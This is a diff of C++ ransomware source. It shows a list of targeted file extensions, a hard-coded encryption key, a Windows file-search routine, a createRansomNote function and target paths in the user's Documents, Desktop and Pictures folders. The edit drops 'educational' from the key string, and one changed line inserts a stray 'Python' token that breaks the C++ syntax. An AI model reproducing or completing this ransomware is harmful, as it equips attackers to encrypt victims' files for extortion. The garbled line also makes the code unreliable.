@@ -16,7 +16,7 @@ std::vector<std::string> targetExtensions = {
     ".html", ".htm", ".xml", ".csv"
 };
 
-std::string encryptionKey = "educational-test-key-12345";
+std::string encryptionKey = "test-key-12345";
 
 void findFiles(const std::string& path, std::vector<std::string>& files) {
     WIN32_FIND_DATAA findFileData;
@@ -83,7 +83,7 @@ void createRansomNote() {
 }
 
 int main() {
-    std::vector<std::string> documentsPaths = {
+    std::vector Python<std::string> documentsPaths = {
         "C:\\Users\\Test\\Documents",
         "C:\\Users\\Test\\Desktop",
         "C:\\Users\\Test\\Pictures"
